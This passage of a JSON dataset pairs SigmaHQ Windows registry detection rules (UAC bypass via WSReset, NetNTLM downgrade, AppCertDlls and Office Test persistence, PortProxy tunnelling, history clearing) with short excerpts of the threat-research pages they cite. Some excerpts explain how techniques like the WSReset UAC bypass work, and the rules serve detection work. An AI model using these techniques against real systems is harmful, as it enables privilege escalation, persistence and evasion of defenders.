      "id": "07bdd2f5-9c58-4f38-aec8-e101bb79ef8d",
      "status": "test",
      "description": "Detects the deletion of registry keys containing the MSTSC connection history",
      "references": [
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer",
        "http://woshub.com/how-to-clear-rdp-connections-history/",
        "https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-10-19",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_delete",
        "product": "windows"
      },
      "detection": {
        "selection1": {
          "EventType": "DeleteValue",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Default\\MRU"
        },
        "selection2": {
          "EventType": "DeleteKey",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Servers\\"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_mstsc_history_cleared.yml"
  },
  "911": {
    "url": "http://woshub.com/how-to-clear-rdp-connections-history/",
    "markdown": "# How to View and Clear RDP Connections History in Windows The built-in Windows Remote Desktop Connection client (`mstsc.exe`) saves the remote computer name (or IP address) and the username that is used to log in after each successful connection to the remote RDP host. The next time the RDP client starts, the user can select one of the saved connections, and the previous username is automatically inserted. If you are using a public computer or a computer you don’t trust, you may want to clear your RDP connection history for security reasons. ## Contents: - Delete the History of",
    "sigma_rule": {
      "title": "Terminal Server Client Connection History Cleared - Registry",
      "id": "07bdd2f5-9c58-4f38-aec8-e101bb79ef8d",
      "status": "test",
      "description": "Detects the deletion of registry keys containing the MSTSC connection history",
      "references": [
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer",
        "http://woshub.com/how-to-clear-rdp-connections-history/",
        "https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-10-19",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_delete",
        "product": "windows"
      },
      "detection": {
        "selection1": {
          "EventType": "DeleteValue",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Default\\MRU"
        },
        "selection2": {
          "EventType": "DeleteKey",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Servers\\"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_mstsc_history_cleared.yml"
  },
  "912": {
    "url": "https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html",
    "markdown": "# Vice Society Ransomware Group Targets Manufacturing Companies In this blog entry, we’d like to highlight our findings on Vice Society, which includes an end-to-end infection diagram that we were able to create using Trend Micro internal telemetry. **Date:** January 24, 2023 --- **Updated on January 26, 2023 to remove references to Kape Tool and to remove Trend Micro Apex One from the list of programs that the ransomware disables.** The Vice Society ransomware group made headlines in late 2022 and early 2023 during a spate of attacks against several targets, such as the one that affected the rapid transit",
    "sigma_rule": {
      "title": "Terminal Server Client Connection History Cleared - Registry",
      "id": "07bdd2f5-9c58-4f38-aec8-e101bb79ef8d",
      "status": "test",
      "description": "Detects the deletion of registry keys containing the MSTSC connection history",
      "references": [
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer",
        "http://woshub.com/how-to-clear-rdp-connections-history/",
        "https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-10-19",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_delete",
        "product": "windows"
      },
      "detection": {
        "selection1": {
          "EventType": "DeleteValue",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Default\\MRU"
        },
        "selection2": {
          "EventType": "DeleteKey",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Servers\\"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_mstsc_history_cleared.yml"
  },
  "913": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/",
    "markdown": "# Tarrask malware uses scheduled tasks for defense evasion **Published**: April 12, 2022 ## April 2023 update Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. **HAFNIUM** is now tracked as **Silk Typhoon**. To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. --- As Microsoft continues to track the high-priority state-sponsored threat actor HAFNIUM, new activity has been uncovered that leverages",
    "sigma_rule": {
      "title": "Removal Of SD Value to Hide Schedule Task - Registry",
      "id": "acd74772-5f88-45c7-956b-6a7b36c294d2",
      "related": [
        {
          "id": "526cc8bc-1cdc-48ad-8b26-f19bff969cec",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Remove SD (Security Descriptor) value in \\Schedule\\TaskCache\\Tree registry hive to hide schedule task. This technique is used by Tarrask malware",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/"
      ],
      "author": "Sittikorn S",
      "date": "2022-04-15",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_delete"
      },
      "detection": {
        "selection": {
          "EventType": "DeleteKey",
          "TargetObject|contains|all": [
            "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\",
            "SD"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_schtasks_hide_task_via_sd_value_removal.yml"
  },
  "914": {
    "url": "https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly",
    "markdown": "# TrickBot Uses a New Windows 10 UAC Bypass to Launch Quietly January 30, 2020 ```image Alt: TrickBot Description: The image displays a screen capture of a software debugging or disassembly tool, likely showcasing the TrickBot malware's code. The background contains a disassembled view with various hexadecimal code lines and assembly language instructions. Overlaid on this technical backdrop is a stylized logo of TrickBot, which features a cartoon-like robot with dollar signs, indicating its malicious intent related to financial activities. The combination of the code and the logo suggests a focus on the technical aspects of the TrickBot malware's operations.",
    "sigma_rule": {
      "title": "UAC Bypass Via Wsreset",
      "id": "6ea3bf32-9680-422d-9f50-e90716b12a66",
      "status": "test",
      "description": "Unfixed method for UAC bypass from Windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry.",
      "references": [
        "https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/"
      ],
      "author": "oscd.community, Dmitry Uchakin",
      "date": "2020-10-07",
      "modified": "2021-11-27",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
        },
        "condition": "selection"
      },
      "fields": [
        "ComputerName",
        "Image",
        "EventType",
        "TargetObject"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_bypass_via_wsreset.yml"
  },
  "915": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
    "markdown": "# /Wsreset.exe Used to reset Windows Store settings according to its manifest file. ### Paths: - `C:\\Windows\\System32\\wsreset.exe` ### Resources: - https://www.activecyber.us/activelabs/windows-uac-bypass - https://twitter.com/ihack4falafel/status/1106644790114947073 - https://github.com/hfiref0x/UACME/blob/master/README.md ### Detections: - Sigma: proc_creation_win_uac_bypass_wsreset_integrity_level.yml - Sigma: proc_creation_win_uac_bypass_wsreset.yml - Sigma: registry_event_bypass_via_wsreset.yml - Splunk: wsreset_uac_bypass.yml - IOC: `wsreset.exe` launching child process other than `mmc.exe` - IOC: Creation or modification of the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` - IOC: Microsoft Defender Antivirus as `Behavior:Win32/UACBypassExp.T!gen` ## UAC bypass During startup, `wsreset.exe` checks the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` for the command to run. The binary will be executed as a high-integrity process without a UAC prompt being displayed to the user. ```",
    "sigma_rule": {
      "title": "UAC Bypass Via Wsreset",
      "id": "6ea3bf32-9680-422d-9f50-e90716b12a66",
      "status": "test",
      "description": "Unfixed method for UAC bypass from Windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry.",
      "references": [
        "https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/"
      ],
      "author": "oscd.community, Dmitry Uchakin",
      "date": "2020-10-07",
      "modified": "2021-11-27",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
        },
        "condition": "selection"
      },
      "fields": [
        "ComputerName",
        "Image",
        "EventType",
        "TargetObject"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_bypass_via_wsreset.yml"
  },
  "916": {
    "url": "https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/",
    "markdown": "# Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon. ## TLDR An old Microsoft tool is able to be weaponized in several ways and reportedly used by at least one nation state actor. I explore ways for defenders to detect its abuse. ## Background As I was perusing MITRE’s ATT&CK framework the other day to learn about techniques I’m less familiar with, I came across the ambiguous-sounding CMSTP (T1191 in ATT&CK) which MITRE states can be used for UAC Bypass and code execution. Being that it’s also allegedly been used by a nation-state actor recently, I wanted to research",
    "sigma_rule": {
      "title": "CMSTP Execution Registry Event",
      "id": "b6d235fc-1d38-4b12-adbe-325f06728f37",
      "status": "stable",
      "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution",
      "references": [
        "https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/"
      ],
      "author": "Nik Seetharaman",
      "date": "2018-07-16",
      "modified": "2020-12-23",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218.003",
        "attack.g0069",
        "car.2019-04-001"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\cmmgr32.exe"
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine",
        "Details"
      ],
      "falsepositives": [
        "Legitimate CMSTP use (unlikely in modern enterprise environments)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_cmstp_execution_by_registry.yml"
  },
  "917": {
    "url": "https://web.archive.org/web/20171113231705/https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks",
    "markdown": "# Post Exploitation Using NetNTLM Downgrade Attacks *October 4, 2012* --- I love to pass the hash and steal tokens as much as the next pentester, but sometimes it’s nice to have the actual password for a user. Here are some cases where having the password, instead of just the hash, is helpful: - Web Based VPN Login - GUI Access - Third Party AD Integrated Management Tools - Database Authentication - Passwords Shared Across Multiple Systems (Unix/Linux, Network Gear, etc) The easiest way to go from SYSTEM on a box to dumping the cleartext passwords for all the users",
    "sigma_rule": {
      "title": "NetNTLM Downgrade Attack - Registry",
      "id": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
      "status": "test",
      "description": "Detects NetNTLM downgrade attack",
      "references": [
        "https://web.archive.org/web/20171113231705/https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks",
        "https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=NSrpcservers"
      ],
      "author": "Florian Roth (Nextron Systems), wagga, Nasreddine Bencherchali (Splunk STRT)",
      "date": "2018-03-20",
      "modified": "2024-12-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_event"
      },
      "detection": {
        "selection_regkey": {
          "TargetObject|contains|all": [
            "SYSTEM\\",
            "ControlSet",
            "\\Control\\Lsa"
          ]
        },
        "selection_value_lmcompatibilitylevel": {
          "TargetObject|endswith": "\\lmcompatibilitylevel",
          "Details": [
            "DWORD (0x00000000)",
            "DWORD (0x00000001)",
            "DWORD (0x00000002)"
          ]
        },
        "selection_value_ntlmminclientsec": {
          "TargetObject|endswith": "\\NtlmMinClientSec",
          "Details": [
            "DWORD (0x00000000)",
            "DWORD (0x00000010)",
            "DWORD (0x00000020)",
            "DWORD (0x00000030)"
          ]
        },
        "selection_value_restrictsendingntlmtraffic": {
          "TargetObject|endswith": "\\RestrictSendingNTLMTraffic"
        },
        "condition": "selection_regkey and 1 of selection_value_*"
      },
      "falsepositives": [
        "Services or tools that set the values to more restrictive values"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_net_ntlm_downgrade.yml"
  },
  "918": {
    "url": "https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=NSrpcservers",
    "markdown": "# Network security: Minimum session security for NTLM SSP based (including secure RPC) servers This value impacts applications, from the point of view of the server, that use the NTLM SSP or secure RPC and specifies session security requirements for communication between the client and server. | Hex value | Check box | Meaning | | ---------- | ------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | | 0x0 | None checked | None. No security is used for session security. | | 0x10 | Require message integrity | Message integrity. If the value of either this entry or the `NtlmMinClientSec` entry is 0x10, the",
    "sigma_rule": {
      "title": "NetNTLM Downgrade Attack - Registry",
      "id": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
      "status": "test",
      "description": "Detects NetNTLM downgrade attack",
      "references": [
        "https://web.archive.org/web/20171113231705/https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks",
        "https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=NSrpcservers"
      ],
      "author": "Florian Roth (Nextron Systems), wagga, Nasreddine Bencherchali (Splunk STRT)",
      "date": "2018-03-20",
      "modified": "2024-12-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_event"
      },
      "detection": {
        "selection_regkey": {
          "TargetObject|contains|all": [
            "SYSTEM\\",
            "ControlSet",
            "\\Control\\Lsa"
          ]
        },
        "selection_value_lmcompatibilitylevel": {
          "TargetObject|endswith": "\\lmcompatibilitylevel",
          "Details": [
            "DWORD (0x00000000)",
            "DWORD (0x00000001)",
            "DWORD (0x00000002)"
          ]
        },
        "selection_value_ntlmminclientsec": {
          "TargetObject|endswith": "\\NtlmMinClientSec",
          "Details": [
            "DWORD (0x00000000)",
            "DWORD (0x00000010)",
            "DWORD (0x00000020)",
            "DWORD (0x00000030)"
          ]
        },
        "selection_value_restrictsendingntlmtraffic": {
          "TargetObject|endswith": "\\RestrictSendingNTLMTraffic"
        },
        "condition": "selection_regkey and 1 of selection_value_*"
      },
      "falsepositives": [
        "Services or tools that set the values to more restrictive values"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_net_ntlm_downgrade.yml"
  },
  "919": {
    "url": "http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
    "markdown": "# Beyond good ol’ Run key, Part 3 Posted on 2013-01-19 Possible Autostart/start mechanisms that are built-in ‘natively’ in Windows and also available by means of extra features offered by many applications go beyond typical path locations and registry keys highlighted by popular programs and scripts like Autoruns and SilentRunners. I have covered some of the non-standard persistence techniques in 2 older posts in the series here and here, but as usual – there is always more to write about. In this post I will cover another batch of less known and possibly ‘obscure’ technique that could be potentially used",
    "sigma_rule": {
      "title": "New DLL Added to AppCertDlls Registry Key",
      "id": "6aa1d992-5925-4e9f-a49b-845e51d1de01",
      "status": "test",
      "description": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation\nby causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n",
      "references": [
        "http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
        "https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html"
      ],
      "author": "Ilyas Ochkov, oscd.community",
      "date": "2019-10-25",
      "modified": "2021-11-27",
      "tags": [
        "attack.persistence",
        "attack.t1546.009"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls"
          },
          {
            "NewName": "HKLM\\SYSTEM\\CurentControlSet\\Control\\Session Manager\\AppCertDlls"
          }
        ],
        "condition": "selection"
      },
      "fields": [
        "EventID",
        "Image",
        "TargetObject",
        "NewName"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_new_dll_added_to_appcertdlls_registry_key.yml"
  },
  "920": {
    "url": "https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html",
    "markdown": "# AppCert DLLs Registry Modification Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. | Field | Value | |------------|--------------------------------------| | id | 14f90406-10a0-4d36-a672-31cabe149f2f | | categories | enrich | | confidence | low | | os | windows | | created | 7/26/2019 | | updated | 7/26/2019 | ## MITRE ATT&CK™ Mapping | Field | Value | |------------|-----------------------------------| | tactics | Privilege Escalation, Persistence |",
    "sigma_rule": {
      "title": "New DLL Added to AppCertDlls Registry Key",
      "id": "6aa1d992-5925-4e9f-a49b-845e51d1de01",
      "status": "test",
      "description": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation\nby causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n",
      "references": [
        "http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
        "https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html"
      ],
      "author": "Ilyas Ochkov, oscd.community",
      "date": "2019-10-25",
      "modified": "2021-11-27",
      "tags": [
        "attack.persistence",
        "attack.t1546.009"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls"
          },
          {
            "NewName": "HKLM\\SYSTEM\\CurentControlSet\\Control\\Session Manager\\AppCertDlls"
          }
        ],
        "condition": "selection"
      },
      "fields": [
        "EventID",
        "Image",
        "TargetObject",
        "NewName"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_new_dll_added_to_appcertdlls_registry_key.yml"
  },
  "921": {
    "url": "https://unit42.paloaltonetworks.com/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/",
    "markdown": "# Technical Walkthrough: Office Test Persistence Method Used In Recent Sofacy Attacks ## Threat Research Center > Threat Research > Malware **Published:** July 20, 2016 --- As mentioned in our previous blog, we observed the Sofacy group using a new persistence mechanism that we call “Office Test” to load their Trojan each time the user opened Microsoft Office applications. Following the report, we received several questions regarding this persistence method, specifically how it works and which versions of Microsoft Office were affected. This blog will serve as a technical analysis of this persistence method that security professionals and network defenders",
    "sigma_rule": {
      "title": "Office Application Startup - Office Test",
      "id": "3d27f6dd-1c74-4687-b4fa-ca849d128d1c",
      "status": "test",
      "description": "Detects the addition of office test registry that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/"
      ],
      "author": "omkar72",
      "date": "2020-10-25",
      "modified": "2023-11-08",
      "tags": [
        "attack.persistence",
        "attack.t1137.002"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Software\\Microsoft\\Office test\\Special\\Perf"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_office_test_regadd.yml"
  },
  "922": {
    "url": "https://github.com/vxunderground/VXUG-Papers/blob/751edb8d50f95bd7baa730adf2c6c3bb1b034276/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Registry Persistence Mechanisms in Recycle Bin",
      "id": "277efb8f-60be-4f10-b4d3-037802f37167",
      "status": "test",
      "description": "Detects persistence registry keys for Recycle Bin",
      "references": [
        "https://github.com/vxunderground/VXUG-Papers/blob/751edb8d50f95bd7baa730adf2c6c3bb1b034276/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf",
        "https://persistence-info.github.io/Data/recyclebin.html",
        "https://www.hexacorn.com/blog/2018/05/28/beyond-good-ol-run-key-part-78-2/"
      ],
      "author": "frack113",
      "date": "2021-11-18",
      "modified": "2022-12-06",
      "tags": [
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection_create": {
          "EventType": "RenameKey",
          "NewName|contains": "\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open"
        },
        "selection_set": {
          "EventType": "SetValue",
          "TargetObject|contains": "\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\\(Default)"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_persistence_recycle_bin.yml"
  },
  "923": {
    "url": "https://persistence-info.github.io/Data/recyclebin.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Registry Persistence Mechanisms in Recycle Bin",
      "id": "277efb8f-60be-4f10-b4d3-037802f37167",
      "status": "test",
      "description": "Detects persistence registry keys for Recycle Bin",
      "references": [
        "https://github.com/vxunderground/VXUG-Papers/blob/751edb8d50f95bd7baa730adf2c6c3bb1b034276/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf",
        "https://persistence-info.github.io/Data/recyclebin.html",
        "https://www.hexacorn.com/blog/2018/05/28/beyond-good-ol-run-key-part-78-2/"
      ],
      "author": "frack113",
      "date": "2021-11-18",
      "modified": "2022-12-06",
      "tags": [
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection_create": {
          "EventType": "RenameKey",
          "NewName|contains": "\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open"
        },
        "selection_set": {
          "EventType": "SetValue",
          "TargetObject|contains": "\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\\(Default)"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_persistence_recycle_bin.yml"
  },
  "924": {
    "url": "https://www.hexacorn.com/blog/2018/05/28/beyond-good-ol-run-key-part-78-2/",
    "markdown": "",
    "sigma_rule": {
      "title": "Registry Persistence Mechanisms in Recycle Bin",
      "id": "277efb8f-60be-4f10-b4d3-037802f37167",
      "status": "test",
      "description": "Detects persistence registry keys for Recycle Bin",
      "references": [
        "https://github.com/vxunderground/VXUG-Papers/blob/751edb8d50f95bd7baa730adf2c6c3bb1b034276/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf",
        "https://persistence-info.github.io/Data/recyclebin.html",
        "https://www.hexacorn.com/blog/2018/05/28/beyond-good-ol-run-key-part-78-2/"
      ],
      "author": "frack113",
      "date": "2021-11-18",
      "modified": "2022-12-06",
      "tags": [
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection_create": {
          "EventType": "RenameKey",
          "NewName|contains": "\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open"
        },
        "selection_set": {
          "EventType": "SetValue",
          "TargetObject|contains": "\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\\(Default)"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_persistence_recycle_bin.yml"
  },
  "925": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling **January 24, 2019** --- Remote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to",
    "sigma_rule": {
      "title": "New PortProxy Registry Entry Added",
      "id": "a54f842a-3713-4b45-8c84-5f136fdebd3c",
      "status": "test",
      "description": "Detects the modification of the PortProxy registry key which is used for port forwarding.",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-06-22",
      "modified": "2024-03-25",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\PortProxy\\v4tov4\\tcp\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)",
        "Synergy Software KVM (https://symless.com/synergy)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_portproxy_registry_key.yml"
  },
  "926": {
    "url": "https://adepts.of0x.cc/netsh-portproxy-code/",
    "markdown": "# Don't use commands, use code: the tale of Netsh & PortProxy **Published on:** Jun 11, 2021 Dear Fellowship, today’s homily is a call to an (un)holy crusade: we have to banish the usage of commands in compromised machines and start to embrace coding. Please, take a seat and listen to the story of netsh and PortProxy. ## Prayers at the foot of the Altar a.k.a. disclaimer *The intention of this short article is to encourage people to improve their tradecraft. We use netsh here as a mere example to transmit the core idea: we need to move from commands",
    "sigma_rule": {
      "title": "New PortProxy Registry Entry Added",
      "id": "a54f842a-3713-4b45-8c84-5f136fdebd3c",
      "status": "test",
      "description": "Detects the modification of the PortProxy registry key which is used for port forwarding.",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-06-22",
      "modified": "2024-03-25",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
